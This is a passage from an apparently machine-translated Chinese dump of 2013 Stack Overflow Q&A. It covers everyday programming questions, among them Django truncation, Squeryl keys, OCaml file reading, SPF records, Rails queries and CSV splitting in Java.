在任何地方切断内容，可能会破坏网页的其余部分。python有没有办法关闭所有打开的标签或只获得一定数量的顶级块？例如，2 个块将是前两个`<p></p>`标签。在显示文章的简短预览时，我已经看到 word press 具有此功能。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-06T05:29:50.133

如果您需要在模板中执行此操作，请查看 truncatewords-html：[https ://docs.djangoproject.com/en/dev/ref/templates/builtins/#truncatewords-html](https://docs.djangoproject.com/en/dev/ref/templates/builtins/#truncatewords-html)

或者在其他地方，如果您需要一些自定义行为，您可以使用应该适用于大多数用例的底层`django.utils.text.Truncator`类（[https://github.com/django/django/blob/1.7/django/utils/text.py#L65](https://github.com/django/django/blob/1.7/django/utils/text.py#L65) ）该代码作为自己实现它的参考。

**更新**：

如果你需要`django.utils.text.Truncator`直接使用，这就是你实例化和调用`words()`方法的方式（这正是 truncatewords-html 过滤器的作用）

```
Truncator(value).words(length, html=True, truncate=' ...') 
```

# c++ - 在二维向量字符串中查找重复项

> ID：15847322
> 
> 赞同：0
> 
> 时间：2013-04-06T05:20:35.073
> 
> 标签：c++, stl, duplicates

我想找出二维向量表是否重复。我可以看到很多使用独特的 STL 算法删除重复项的程序。对于 100,000 条记录，哪种方法是查找“是否重复”的最佳方法。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-06T07:28:32.253

我会对这个表进行排序，然后用二进制搜索来搜索 dups。这将是`O(n^2 log n)`复杂的。比较排序与这样的东西：

```
p1.x < p2.x   ||  (p1.x==p2.x  &&  p1.y < p2.y) 
```

大多数人会告诉你为此使用哈希表，但`O(n^2)`在最坏的情况下，哈希表有构建时间。所以总复杂度将是`O(n^3)`。

# ios - 工具栏后退按钮不起作用

> ID：15847325
> 
> 赞同：0
> 
> 时间：2013-04-06T05:20:47.403
> 
> 标签：ios, xcode, xib, uitoolbar, uitoolbaritem

我正在使用故事板做一个项目，在一个视图控制器中我有一个按钮。当我点击它时，它将移动到下一个视图控制器，但它是一个单独的 xib 文件。现在我尝试向那个xib文件添加一个后退按钮所以我可以回到我的故事板但它对我不起作用？

我尝试使用以下代码从 xib 移动到情节提要视图控制器

```
viewcontrollerOne *list= [self.storyboard instantiateViewControllerWithIdentifier:@"detail"];
[self presentModalViewController:list animated:YES]; 
```

请让我知道它不起作用的原因？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-06T11:01:44.897

您可以尝试将您的项目更改为 UINavigationController 然后在情节提要中您可以链接视图

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-06T11:07:07.260

当您想从 xib 移动到 Storyboard 中的视图控制器时，此代码将起作用，它对我有用。

```
UIStoryboard *storyboard = [UIStoryboard storyboardWithName:@"MainStoryboard" bundle:nil];
UIViewController *vc = [storyboard instantiateViewControllerWithIdentifier:@"IDENTIFIER"];
[self.navigationController pushViewController:vc animated:YES]; 
```

# node.js - 是否可以在 node-postgres 中设置 postgres search_path？

> ID：15847326
> 
> 赞同：1
> 
> 时间：2013-04-06T05:20:58.707
> 
> 标签：node.js, postgresql, node-postgres

我正在将应用程序从 RoR 移动到 Express.js。ActiveRecord postgres 适配器具有 search_path 配置选项。

是否可以为 Client 设置 search_path ？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-05-15T00:57:50.683

如果可能的话，我的偏好是在数据库或用户上碰碰运气。

```
ALTER [DATABASE or USER] [name] set search_path='[searchpath]' 
```

如果失败，您始终可以通过构建连接逻辑来确保设置搜索路径：

```
SET search_path='[searchpath]' 
```

这将在连接上设置它。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2021-11-20T16:43:45.763

是的，您可以自动触发`SET`命令“on”连接事件

```
pool.on('connect', (client) => {
  client.query('SET search_path TO schema,public');
}); 
```

# redirect - 我的共享主机帐户中的奇怪重定向

> ID：15847328
> 
> 赞同：-1
> 
> 时间：2013-04-06T05:21:03.433
> 
> 标签：redirect, shared-hosting, bluehost

我已经为此开了一张票，但我想了解我的问题的内部工作。

我输入：

```
http://connect.mydomain.com 
```

地址栏变为：

```
http://connect.mydomain.com/~username/public_html/mydomaindir/connectsubdomaindir 
```

一切都搞砸了。我被告知这与 DNS cange 有关，因为我购买了专用 IP，但这不是问题，因为我在同一帐户中的其他域工作正常。

我可以从哪里开始寻找这个？

附加信息：

我检查了我的 cpanel 上的 dns 条目，它们看起来与我在同一帐户中拥有的所有其他插件域相同。

我收到如下错误：

*   错误 310 (net::ERR_TOO_MANY_REDIRECTS
*   301 反弹（从萤火虫观察到）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-07T09:23:33.067

答案很简单，但对不知道 DNS 工作原理的我来说不是。

该域已在另一个注册商处注册，我没有更新 eDNS 中的 A 记录。它指向错误的IP。

在我更改为专用 IP 后，我应该更改域的 A 记录。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-06T08:01:50.090

我建议您必须首先需要等到 DNS 传播完成。根据我的快速研究，DNS 传播的最长时间需要 72 小时，精确到 3 天。

# c# - 局部变量中的 Parallel.Foreach 与 Foreach 和 Task

> ID：15847329
> 
> 赞同：1
> 
> 时间：2013-04-06T05:21:11.203
> 
> 标签：c#, parallel-processing, task-parallel-library

当我们使用`foreach`并且`Tasks`我们需要使用这样的局部变量时：

```
List<Task> TaskPool = new List<Task>();
foreach (TargetType Item in Source)
{
  TargetType localItem = Item;
  TaskPool.Add(Task.Factory.StartNew(() => DoSomething(localItem)));
}
Task.WaitAll(TaskPool.ToArray()); 
```

但是怎么样`Parallel.Foreach`，我这样使用它：

```
Parallel.ForEach(Source, (TargetType item) => DoSomething(item)); 
```

因此，如您所见，没有任何局部变量。但是如何`Parallel.Foreach`工作？不需要引入任何局部变量吗？或者如果需要，我该如何定义它？

**更新**

.NET 4 和 .NET 4.5 有什么区别吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-06T11:19:18.730

您没有定义任何局部变量`Parallel.ForEach`-`item`只不过是一个形式参数 - 的实现代码`Parallel.ForEach`是必须处理变量的代码，无论它们是本地的、捕获的还是其他的。

无需定义与形式参数相关的局部变量`Parallel.ForEach`- 您的匿名委托的调用者代码将处理该变量并将其传递给您的函数。

但是在 C#4 中，如果捕获另一个变量，则可能需要使用局部变量，即：

```
void DoSomething(ItemType item, OtherType other) {
}

void YourFunction(IEnumerable<ItemType> items, IEnumerable<OtherType> others) {

    foreach (var otherItem in others) {
        var localOtherItem = otherItem;
        Parallel.ForEach(items, item => DoSomething(item, localOtherItem));
    }
} 
```

您可以看到上面的区别：`localOtherItem`取自定义匿名函数的上下文：称为闭包。而其中的项目`items`只是作为方法参数传递给匿名函数。

简而言之：C#中的`item`in`Parallel.ForEach`和in是两个非常不同的问题。`item``foreach`

# scala - 如何使用 Squeryl 的 KeyedEntity？

> ID：15847330
> 
> 赞同：2
> 
> 时间：2013-04-06T05:21:17.683
> 
> 标签：scala, squeryl

我能找到的与 KeyedEntity 相关的唯一信息是：

*扩展 KeyedEntity[K]（其中 K 是数字类型）的对象将为其 id 字段分配新创建的主键值（生成键的机制特定于每个 DatabaseAdaptor）。*

当我的键控对象是不可变的时，这如何应用？那么我的对象是不是不可能将其 id 字段分配给新创建的主键值？

我假设我应该在我的对象上覆盖 KeyedEntity 内的抽象 id 方法，以便返回我的对象​​的键。但是，当 Squeryl 写入数据库时​​，它如何找出使用哪个字段作为键呢？

如果重要的话，我正在使用 Squeryl 9.5。我找不到很多关于这些问题的文档。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-10T14:20:39.410

在 0.95 中，Squeryl 将寻找一个字段`id`，或者在 的情况下[`CompositeKey`](http://squeryl.org/composite-keys.html)，一个名为 的函数`id`。因此，这些定义中的任何一个都可以工作：

```
case class MyTable(val id:Long, ...) extends KeyedEntity[Long]

case class MyTable(val field1:Long, val field2:String, ...) extends KeyedEntity[CompositeKey2[Long, String]] {
  def id = compositeKey(field1, field2)
} 
```

如果您使用单个字段，它会查找名为 的 db 字段`id`，或者您可以使用`@Column`注释在 db 中指定备用名称。在 a 的情况下`CompositeKey`，它将查找与 key 的组成部分相对应的 db 字段（在上面的示例中：`field1`和`field2`）。您始终可以使用`@Column`映射到数据库中的不同列名。

正如在另一个答案中提到的，您可以为大多数字段设置别名，但是`id`在 0.95 中不起作用 - 请参阅：[尝试使用 Squeryl 插入时的 ClassCastException](https://stackoverflow.com/questions/13939922/classcastexception-when-trying-to-insert-with-squeryl/13941347#13941347)。在 0.96 中，事情发生了一些变化，`KeyedEntity`不再需要，您可以在[此处](http://squeryl.org/0.9.6.html)找到更多信息。

如果您对 insert 方法的内部工作原理感到好奇，可以查看[github上的](https://github.com/max-l/Squeryl/blob/master/src/main/scala/org/squeryl/Table.scala#L37)[源代码`Table`](https://github.com/max-l/Squeryl/blob/master/src/main/scala/org/squeryl/Table.scala#L37)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-07T16:16:27.760

> 那么我的对象是不是不可能将其 id 字段分配给新创建的主键值？

使用正常的标准方式是不可能的，是的，但这不是正在发生的事情。我们不是在修改对象——我们是在创建新对象。例如，方法 .insert(myEntry) 返回您调用该方法时已插入的对象，而不是您原来的 myEntry。

> 我假设我应该在我的对象上覆盖 KeyedEntity 内的抽象 id 方法，以便返回我的对象​​的键。

不，您不必这样做 - 您可以将其留空。如果您将表字段命名为与“id”不同的名称 - 不要忘记还包含一个函数，例如`def id = myIdField`.

> 但是，当 Squeryl 写入数据库时​​，它如何找出使用哪个字段作为键呢？

它搜索一个具有确切名称的方法——“id”。或者，像我之前写的那样的手动功能。

回答主题标题——例如，KeyedEntity 的一个用例是调用诸如 myEntities.lookup(30L) 之类的方法。或者，能够调用“updateOrInsert”方法。从头开始创建新数据库时自动定义“主键”。和别的...

> 我找不到很多关于这些问题的文档。

这是查找方法，例如：[http](http://squeryl.org/selects.html) ://squeryl.org/selects.html 实际上，我现在写的所有内容都是前段时间从该站点学到的。

# file-io - 读取文本文件和连接行

> ID：15847335
> 
> 赞同：1
> 
> 时间：2013-04-06T05:21:47.700
> 
> 标签：file-io, ocaml

我已经发布了一些关于文件 IO 的问题，我只是想找到适合我需要的问题，我已经找到并且我也在谷歌上搜索了分配，所以我猜我最终的文件 IO 问题是（你会在这里看到一些伪代码）：

```
let ic = open_in "myfile.txt" in
try
  while true do
    let line = input_line ic in
    line += "\n" + line
  done
with End_of_file -> close_in ic;

print_endline line;; 
```

我已经尝试过 String.concat "\n" (line; line) 显然它是无效的，但我不确定在这种情况下我将如何使用 String.concat 方法。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-06T08:45:17.323

在这种情况下，字符串连接是不够的，因为`str1 ^ str2`时间和内存与大小的总和呈线性关系，因此迭代连接会表现出二次行为——你想避免这种情况。

您的问题有几种解决方案：

1.  使用专为累积字符串而设计的[Buffer模块](http://caml.inria.fr/pub/docs/manual-ocaml/libref/Buffer.html)
2.  收集行列表中的行，最后使用高效`String.concat : string -> string list -> string`功能（[文档](http://caml.inria.fr/pub/docs/manual-ocaml/libref/String.html#VALconcat)）一次性将它们连接起来。
3.  使用为您执行此操作的现有库。例如，[Batteries](http://ocaml-batteries-team.github.io/batteries-included/hdoc2/)具有[input_all](http://ocaml-batteries-team.github.io/batteries-included/hdoc2/BatPervasives.html#VALinput_all)函数，可将输入通道的全部内容放入文件中。

.

```
let read_file file =
  let ic = open_in file in
  let buf = Buffer.create (in_channel_length ic) in
  try
    while true do
      let line = input_line ic in
      Buffer.add_string buf line;
      Buffer.add_char buf '\n';
    done; assert false
  with End_of_file ->
    Buffer.contents buf
;;

let read_file file =
  let ic = open_in file in
  let lines = ref [] in
  try
    while true do
      let line = input_line ic in
      lines := line :: !lines
    done; assert false
  with End_of_file ->
    String.concat "\n" !lines

let test = read_file "blah.ml" 
```

# iphone - Linkedin 与 OAuth2 ios

> ID：15847337
> 
> 赞同：6
> 
> 时间：2013-04-06T05:22:49.847
> 
> 标签：iphone, objective-c, ios6, linkedin

我正在开发一个 Iphone 应用程序，我想将它与linkedIn 集成。
我想要我的应用程序中的用户信息，我想用 oAuth 2.0 来做。
我尝试与 oAuth 1.0 集成，但在回调中遇到问题。

是否有任何示例或好的教程可用于使用 oAuth 2.0 在 iphone 中进行linkedIn 集成？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-06T05:29:57.780

github.com 上有简单又好的教程，[这里](https://github.com/Himanshulanjewar/LinkedinIntegrationToiOS)

注意：确保集成 Crypto 文件夹的所有类

它肯定会起作用

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2015-01-27T16:45:09.077

此链接为使用 iOS 提供了一个很好的起点——LinkedIn 有或没有带有 oauth2 的后端服务器：

[https://github.com/jeyben/IOSLinkedInAPI](https://github.com/jeyben/IOSLinkedInAPI)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-05-25T08:57:12.870

检查消费者和访问令牌等参数。

检查这些链接：

[https://apigee.com/console/linkedin](https://apigee.com/console/linkedin)

你见过这个： http: [//www.whitneyland.com/2011/03/iphone-oauth.html](http://www.whitneyland.com/2011/03/iphone-oauth.html)

或这个：

[https://github.com/ResultsDirect/LinkedIn-iPhone](https://github.com/ResultsDirect/LinkedIn-iPhone)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2014-03-04T00:12:47.920

对于个人使用和帮助其他需要使用**OAuth 2.0**协议的**LinkedIn示例应用程序的人，我使用 GitHub 上的**[OAuth2Client](https://github.com/nxtbgthng/OAuth2Client)编写了一个客户端：

 **[https://github.com/bouzikas/LinkedinOauth2](https://github.com/bouzikas/LinkedinOauth2)**

# ios - 从 NSString 到 NSNumber 转换过程中的数字修改

> ID：15847341
> 
> 赞同：0
> 
> 时间：2013-04-06T05:23:55.133
> 
> 标签：ios, objective-c, nsstring, nsnumber

```
 NSNumberFormatter * f = [[NSNumberFormatter alloc] init];
    [f setNumberStyle:NSNumberFormatterDecimalStyle];
    NSNumber * myNumber = [f numberFromString:txt2.text];
    ctbook.number=myNumber; 
```

在上面的 ctbook.number 代码参数中是 NSNumber，所以我在传递给 ctbook.number 之前将文本字段值转换为 NSNumber。但是，当我从 ctbook.number 检索值时，我得到了一个新的不同数字，这不是我通过文本字段传递的数字。我错过了什么？这段代码有什么问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-06T05:46:27.350

没有额外的信息很难判断出了什么问题，但是如果你需要一些快速而肮脏的东西，你`intValue`可以`integerValue`使用`NSString`.

```
ctbook.number = @(txt2.txt.intValue); 
```

（`@(x)`语法只是 的简写`[NSNumber numberWithInt:txt2.txt.intValue]`）

请注意，如果您的字符串无效`int`，`intValue`调用将返回`0`。

**编辑**

鉴于最近的评论，问题不在于转换，而在于整数表示。

32 位不足以表示您的数字，因此您最好使用较小的数字或使用`int64_t`.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-06T05:58:26.303

如果您使用“Integer 32”作为 Core Data 属性的数据类型，那么 Core Data 将（默默地）将该值截断为 32 位。如果您分配的`NSNumber`值大于 `2^31 - 1 = 2147483647`，那么它将被截断为 32 位，这解释了为什么在读回数据时会得到不同的值。

您可以在核心数据实体中选择“整数 64”作为数据类型，这将允许最大值为`2^63 - 1 = 9223372036854775807`.

# css - 如何在一个 div 标签中制作多个背景？

> ID：15847343
> 
> 赞同：0
> 
> 时间：2013-04-06T05:24:05.627
> 
> 标签：css, background-image

首先：http: [//jsfiddle.net/83FDf/](http://jsfiddle.net/83FDf/)

我有一个图像设置为我的“菜单”背景......它有蓝色渐变，圆角，然后在底部有白色，蓝色菜单下有轻微的阴影。

![我的形象](https://i.stack.imgur.com/eK5Jg.jpg)

是否可以在一个 div 上使用纯 css 重新创建它？

html:

```
<div class="main_content"></div> 
```

CSS：

```
.main_content
{
    width:900px;
    height:auto;
    background:url(http://i.imgur.com/mionT7y.jpg) no-repeat center top #fff;
    margin:0 auto;
    padding:0 0 50px;
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-06T05:30:51.423

确实有可能，请注意阴影和渐变所需的规则数量是由于不同的浏览器需要不同的语法（`-moz-`是 Firefox 供应商前缀等）。这里有一些方便的工具，可以轻松实现跨浏览器渐变和框阴影。

*   [CSS3 盒子阴影生成器](http://css3gen.com/box-shadow/)
*   [CSS3 渐变生成器](http://gradients.glrzad.com/)
*   [Ultimate CSS Gradient Generator（更多选项，如颜色停止）](http://www.colorzilla.com/gradient-editor/)

在此处阅读有关线性渐变和框阴影的更多信息：

*   [Mozilla 开发人员线性渐变](https://developer.mozilla.org/en-US/docs/CSS/linear-gradient)
*   [Mozilla 开发者 box-shadow](https://developer.mozilla.org/en/docs/CSS/box-shadow)

[jsFiddle](http://jsfiddle.net/Tyriar/BHE47/1/)

```
.main_content
{
    width:100%;
    height:auto;
    margin:0 auto;
    padding:0 0 50px;
    /*background-color:#00F;*/

    /* Add rounded border to top left and top right */
    border-top-left-radius:6px;
    border-top-right-radius:6px;

    /* Apply the gradient as a background image */
    background-image: linear-gradient(bottom, rgb(79,110,189) 0%, rgb(44,188,207) 100%);
    background-image: -o-linear-gradient(bottom, rgb(79,110,189) 0%, rgb(44,188,207) 100%);
    background-image: -moz-linear-gradient(bottom, rgb(79,110,189) 0%, rgb(44,188,207) 100%);
    background-image: -webkit-linear-gradient(bottom, rgb(79,110,189) 0%, rgb(44,188,207) 100%);
    background-image: -ms-linear-gradient(bottom, rgb(79,110,189) 0%, rgb(44,188,207) 100%);
    background-image: -webkit-gradient(
        linear,
        left bottom,
        left top,
        color-stop(0, rgb(79,110,189)),
        color-stop(1, rgb(44,188,207))
    );

    /* Apply white shadow on bottom */
    -webkit-box-shadow: 0px 4px 10px rgba(255, 255, 255, 0.75);
    -moz-box-shadow:    0px 4px 10px rgba(255, 255, 255, 0.75);
    box-shadow:         0px 4px 10px rgba(255, 255, 255, 0.75);
}

body {
    margin:0;
    background-color:gray;
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-06T05:31:40.330

根据我对您的问题的理解，您可以在您的 css 中以逗号分隔的形式使用多个图像并给它们一个位置：

背景图像：url（../pix/logo_quirksmode.gif），url（../pix/logo_quirksmode_inverted.gif）；

# email - 如何将 SPF 记录调整到第二个 SMTP 服务器？

> ID：15847345
> 
> 赞同：0
> 
> 时间：2013-04-06T05:24:22.917
> 
> 标签：email, mail-server, spf

我当前对电子邮件提供商的 SPF 记录配置如下：

```
v=spf1 a mx ptr include:bluehost.com ?all 
```

我注册了一项服务，通过他们的 SMTP 服务器发送我的一些电子邮件，他们建议使用以下 SPF 配置：

```
v=spf1 a mx include:authsmtp.com ~all 
```

我的困境是将两者结合起来？（我还有一些需要使用旧邮件服务器的电子邮件帐户）。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-10-09T17:15:23.950

第一个条目基本上什么都不做，因为`?all`代表 NEUTRAL。您可能追求的是 SOFTFAIL =`~all`

```
v=spf1 a mx ptr include:bluehost.com include:authsmtp.com ~all 
```

确保检查您的 SPF 记录不需要太多 DNS 查找。你可以在这里查看你的主机：http: [//spf.myisp.ch](http://spf.myisp.ch)

# ruby-on-rails - Rails .where() 属性不为空

> ID：15847347
> 
> 赞同：7
> 
> 时间：2013-04-06T05:24:41.497
> 
> 标签：ruby-on-rails, model, associations

我有一个`Page`包含许多`Section`模型的模型，这些模型与`SectionRevision`through相关联`current_revision`。从`Page`模型中，我试图选择所有不为零`Sections`的地方。`current_revision.parent_section_id`

`Section`模型：

```
class Section < ActiveRecord::Base
  belongs_to :page
  has_many :revisions, :class_name => 'SectionRevision', :foreign_key => 'section_id'
  has_many :references

  has_many :revisions, :class_name => 'SectionRevision', 
                       :foreign_key => 'section_id'
  belongs_to :current_revision, :class_name => 'SectionRevision', :foreign_key => 'current_revision_id'

  delegate :position, to: :current_revision

  def set_current_revision
    self.current_revision = self.revisions.order('created_at DESC').first
  end

  def children
    Section.includes(:current_revision).where(:section_revisions => {:parent_section_id => self.id})
  end
end 
```

和`Page`型号：

```
class Page < ActiveRecord::Base
  belongs_to :parent, :class_name => 'Page', :foreign_key => 'parent_page_id'
  has_many :children, :class_name => 'Page', :foreign_key => 'parent_page_id'
  belongs_to :page_image, :class_name => 'Image', :foreign_key => 'page_image_id'
  has_many :sections

  validates_uniqueness_of :title, :case_sensitive => false

  def top_level_sections
    self.sections.includes(:current_revision).where(:section_revisions => {:parent_section_id => "IS NOT NULL"})
  end

end 
```

* * *

`Page.top_level_sections`编写基于：[Rails where condition using NOT NULL](https://stackoverflow.com/questions/4252349/rail-3-where-condition-using-not-null)并且当前产生一个空数组。它不能正确检测“parent_section_id”是否不为空。

如何`Page.top_level_sections`正确书写？

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2013-04-06T05:59:56.197

试试这个：

```
self.sections.includes(:current_revision).
  where("section_revisions.parent_secti‌​on_id IS NOT NULL") 
```

# android - 无法解析资源可绘制

> ID：15847348
> 
> 赞同：1
> 
> 时间：2013-04-06T05:24:59.807
> 
> 标签：android

![在此处输入图像描述](https://i.stack.imgur.com/hT6Z2.png)

它的错误日志说我在这个线程中读到你需要重新启动 Eclipse [Android: failed to convert @drawable/picture into a drawable](https://stackoverflow.com/questions/8874262/android-failed-to-convert-drawable-picture-into-a-drawable)但它对我不起作用我的项目没有运行可能是什么原因它不会运行？它没有问题，只是错误日志。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-06T05:26:55.723

重新启动 Eclipse，问题就会消失。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-06T05:29:54.057

你把xml文件放在drawable文件夹下？？？如果是，请尝试以下选项。如果不在 res 下创建一个可绘制文件夹并将 xml 放在那里。

1.  尝试清除并重建项目

或者

1.  重新启动 Eclipse 并重建项目。

# geocode - 3 种不同的网址 3 种不同的地理编码方式。正确的做法是什么？

> ID：15847350
> 
> 赞同：0
> 
> 时间：2013-04-06T05:25:25.047
> 
> 标签：geocode, google-geocoding-api

我想要的只是获取给定地址的地理编码。我用 Java 做。早些时候我使用了这样的网址

" [http://maps.google.com/maps/geo?q=](http://maps.google.com/maps/geo?q=) " +URLEncoder.encode(addrToFind, ENCODING) + "&output=csv&key=" + MyKEY

它返回给我逗号分隔的结果，如（status_code，lat，lng，precision）然后由于一些外星原因，这个 url 开始给我状态代码 610（无效的 api 密钥）我从谷歌重新生成了浏览器密钥，但徒劳无功。

然后我得到了另一种对新网址进行地理编码的方法，只是在以前的网址中删除了“地理”字样

" [http://maps.google.com/maps?q=](http://maps.google.com/maps?q=) "+URLEncoder.encode(postcode, "UTF-8");

我从这个 url 的最终结果中提取了纬度和经度，但我注意到这个 url 给了我整个 html 页面作为它的响应，而我想要的只是 lat lng 和精度。

然后我终于找到了一个全新的网址“//maps.googleapis.com/maps/api/geocode/json?sensor=false&address="+address_to_geocode; 这给了我 Json 响应，我从中提取了所需的信息。这个 url 也不需要 api 密钥。从以上 3 做 Geocod 的正确方法是什么，或者还有其他最佳方法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-06T05:46:08.900

对于第一个 URL，请参见[this](https://stackoverflow.com/questions/15288244/google-geocoding-v2-api-stopped-working-suddenly/15289007#15289007)，即已弃用的 v2 Geocoding API，其生命周期已延长，但不建议用于新开发。

第二个 URL 是[Google Map](http://maps.google.com)，并且没有记录可用作地理编码器。

当前的[v3 Geocoding API](https://developers.google.com/maps/documentation/geocoding/)是您应该使用的 API。

# perl - 我想使用 perl 中的文件处理删除 txt 文件中的部分行

> ID：15847351
> 
> 赞同：-2
> 
> 时间：2013-04-06T05:26:01.113
> 
> 标签：perl, file-handling

这样如果输入文件中的行是：

```
abc！阿斯达斯
 美国广播公司，萨达斯达
 美国广播公司。

```

输出文件应该是：

```
美国广播公司
 美国广播公司，
 美国广播公司。

```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-06T06:10:00.527

这是一种方法。`split`如果您的数据有任何不同，您可能需要进行调整。它现在所做的只是在空间上分割。

```
#!/usr/bin/perl

use strict;
use warnings;

open (my $in, '<', "in.txt") or die $!;
open (my $out, '>', "out.txt") or die $!;

while (<$in>) {
    my ($val) = split ' ';
    print $out "$val\n";
}

close ($in);
close ($out); 
```

如果我必须这样做，这就是我将从命令行执行的操作：

```
awk '{ print $1 }' in.txt > out.txt 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-06T05:35:10.383

file.txt 包含您帖子中的文本。

Perl 脚本：

```
use strict;
open(IN, 'file.txt');
while(<IN>){
   chomp;
   my(@elems) = split(/\s+/, $_);
   print $elems[0] . "\n";
} 
```

# c# - 使用数据库的 C# 应用程序部署

> ID：15847352
> 
> 赞同：1
> 
> 时间：2013-04-06T05:26:12.407
> 
> 标签：c#, database, sql-server-2005, deployment, .net-3.5

我在 C#.net 3.5 中创建了一个简单的应用程序，我使用数据库来插入、更新、查看和删除记录。现在我想将该应用程序部署在其他计算机上。如何将它与sql数据库打包，这样当我在其他电脑上安装应用程序时，数据库也应该部署到其中。

另一台机器是否应该安装 sql & .net 框架？

任何帮助，将不胜感激！！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-06T23:07:08.570

您应该使用“ [Sql Server Compact](http://msdn.microsoft.com/en-us/data/ff687142.aspx) ”版本...您可以使用您的应用程序轻松部署它...它将创建一个数据库文件，您可以将其与您的应用程序一起导出。

您也可以尝试[Visual Studio Setup Project](http://support.microsoft.com/kb/307353)。这个项目可以自动检测 Sql Compact Client 是否安装在目标机器上......如果没有，它将安装它。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-06T05:32:57.887

[您可以使用spoon stedio](http://spoon.net/studio/features/virtualization)构建您的最终版本，它有很多优势，例如运行.net应用程序而无需安装.net框架和数据库，例如`SQL Server`

> Spoon 是同类产品中唯一支持 32 位和 64 位应用程序虚拟化的虚拟化引擎；系统服务和数据库，例如 SQL Server；以及先进的软件技术，如 DCOM 和 SxS。
> 
> 在没有 .NET 的情况下运行 .NET
> 
> 将 .NET、Java、AIR 和 SQL CE 等运行时依赖项直接嵌入到虚拟应用程序中。在完全干净的桌面上启动。

**已编辑** 有一篇文章关于： [部署您的应用程序和数据库](http://www.codeproject.com/Articles/16231/Deploy-your-Application-and-Database)

# visual-studio-2012 - 更改差异颜色视觉工作室

> ID：15847353
> 
> 赞同：3
> 
> 时间：2013-04-06T05:26:19.887
> 
> 标签：visual-studio-2012

说到 Visual Studio，我很菜鸟。我用的是2012，刚刚下载了主题编辑器，得到了黑曜石暗色背景主题之子。当我做差异时，我得到一个非常难看的绿色背景，用于添加白色文本。很难阅读。我该如何改变？我尝试查看 XML，但我不知道是什么。谢谢。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2014-01-06T19:20:55.913

要更新差异工具中使用的颜色，请导航至工具>选项>环境>字体和颜色。在 Show settings for: 下拉菜单中选择 Text Editor。在显示项目：列表中，您会发现多个差异设置（即添加、差异）。选择要修改的设置并相应地调整颜色。

# vb.net - HRESULT 的异常：0x800A03EC（为 excel 打开函数）

> ID：15847355
> 
> 赞同：1
> 
> 时间：2013-04-06T05:26:28.447
> 
> 标签：vb.net, excel, project-server-2007

我开发了一个从 excel sheet 读取的 Web 应用程序。当我在 vs local host 运行网站时，它工作正常。当我在服务器 2007 中上传网站应用程序时。我得到以下错误消息：

HRESULT 异常：0x800A03EC 说明：在执行当前 Web 请求期间发生未处理的异常。请查看堆栈跟踪以获取有关错误及其源自代码的位置的更多信息。

异常详细信息：System.Runtime.InteropServices.COMException：来自 HRESULT 的异常：0x800A03EC

第 37 行：xlWorkBook = xlApp.Workbooks.Open(Server.MapPath("test2007.xlsx"))

非常感谢您的帮助

# java - 在java中拆分单词并处理双引号

> ID：15847358
> 
> 赞同：1
> 
> 时间：2013-04-06T05:26:44.907
> 
> 标签：java, split

我有通过 FileReader 读取的 CSV 文件。readLine 会给我 CSV 文件的第一行作为字符串。

字符串 str = 1,1,1,"12345",姓名,"猫,狗";

现在逗号（，）是我的分隔符，如果我拆分字符串，它会给我输出

1 1 12345 名字“猫狗”

但不是这个输出，我希望如果“”（双引号）中有一些值；在这种情况下，它应该取完整值（不拆分）

1 1 12345 名字猫，狗

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-04-16T13:04:03.933

尝试这个。

```
public static void main(String[] args) {
   String s = "Sachin,,M,\"Maths,Science,English\",Need to improve in these subjects.";
   String[] splitted = s.split(",(?=([^\"]*\"[^\"]*\")*[^\"]*$)");
   System.out.println(Arrays.toString(splitted));
 } 
```

输出：[Sachin, , M, "Maths,Science,English", 这些科目需要提高。]
例如

分裂[0] =萨钦

拆分 [1] = (空字符串)

分裂[2] = M

splitted[3] = "数学、科学、英语"

splitted[4] = 这些科目需要改进。

无需检查 \ 是否存在。我们正在使用这个正则表达式来拆分 csv 。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-06T05:40:55.203

试试这个：

```
String line = "1,1,1,\"12345\",Name,\"Cat,Dog\"";

    if (line.contains("\"")) {
        line = line.replaceAll("(\"\\,|\\,\")|\\,|\"$", " ");
        System.out.println(line);
    }else {
        // code to split the line
    } 
```

输出 ：`1 1 1 12345 Name Cat Dog`

# c++ - boost.pool 如何实现分配内存的复用？

> ID：15847359
> 
> 赞同：5
> 
> 时间：2013-04-06T05:26:46.630
> 
> 标签：c++, boost-pool

**背景**

我[之前的问题](https://stackoverflow.com/questions/15846037/clarification-on-the-object-pool-pattern?noredirect=1#comment22550028_15846037)让`boost.pool`我详细研究了boost.pool，现在我有一个补充问题来完成我的理解。

**序幕**

[此参考](http://en.wikipedia.org/wiki/Object_pool_pattern)说明了有关对象池模式的以下内容：

> 对象池模式是一种软件创建设计模式，它使用一组随时可用的已初始化对象，而不是按需分配和销毁它们。

